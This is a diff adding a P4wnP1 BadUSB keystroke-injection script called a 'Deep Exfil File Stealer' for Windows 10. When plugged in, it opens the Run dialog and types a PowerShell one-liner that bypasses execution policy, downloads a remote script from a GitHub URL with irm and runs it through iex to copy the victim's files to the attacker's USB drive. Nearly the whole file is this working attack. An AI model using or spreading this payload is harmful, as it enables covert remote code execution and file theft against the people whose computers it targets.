@@ -1,0 +1,22 @@
+REM Title: P4wnP1_Deep_Exfil_File_Stealer_Payload
+REM Author: White Hat Hacker
+REM Description: Performs a deep file exfil to the selected temp drive on the SD card. Make sure the name of your drive is correct below. If you followed the walkthrough its "temp" without the "".
+REM Target: Windows 10 (Powershell)
+REM Props: Beigeworm
+REM Version: 1.0
+REM Category: BadUSB
+
+// SETUP (optional)
+// Add your USB drive Name in quotes for $driveName
+// Add y or n in quotes for $Hidden (hides console window)
+
+// script setup
+layout("us")
+
+// Open Powershell and download script
+delay(1000);
+press("GUI r");
+delay(1000);
+type("powershell -NoP -Ep Bypass -C $driveName = ''; $Hidden = ''; irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Exfiltrate-to-USB/main.ps1 | iex");
+delay(500);
+press("ENTER");
